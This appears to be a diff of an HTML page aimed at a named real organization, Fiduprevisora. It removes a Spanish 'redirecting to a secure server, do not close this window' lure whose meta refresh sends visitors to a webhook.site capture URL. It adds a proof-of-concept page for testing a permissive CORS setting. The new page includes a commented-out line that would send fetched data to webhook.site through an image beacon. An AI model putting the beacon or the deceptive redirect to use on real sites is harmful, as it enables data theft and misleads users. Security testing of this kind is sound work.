@@ -1,12 +1,26 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Redireccionando...</title>
-  <meta name="referrer" content="no-referrer-when-downgrade">
-  <meta http-equiv="refresh" content="2;url=	https://webhook.site/a5babd55-78b3-4388-9821-f2874db3a9de">
+  <title>PoC - CORS Permisivo - Fiduprevisora</title>
 </head>
 <body>
-  <p>Redireccionando a servidor seguro... no cierre esta ventana.</p>
+  <h2>Probando lectura de recurso con CORS mal configurado</h2>
+  <pre id="respuesta">Cargando...</pre>
+
+  <script>
+    fetch("https://rsms.me/inter/inter.css")
+      .then(res => {
+        if (!res.ok) throw new Error("Fallo HTTP");
+        return res.text();
+      })
+      .then(data => {
+        document.getElementById("respuesta").textContent = data;
+        // También podrías exfiltrar:
+        // new Image().src = "https://webhook.site/TU_TOKEN?leak=" + encodeURIComponent(data);
+      })
+      .catch(err => {
+        document.getElementById("respuesta").textContent = "Error: " + err.message;
+      });
+  </script>
 </body>
 </html>
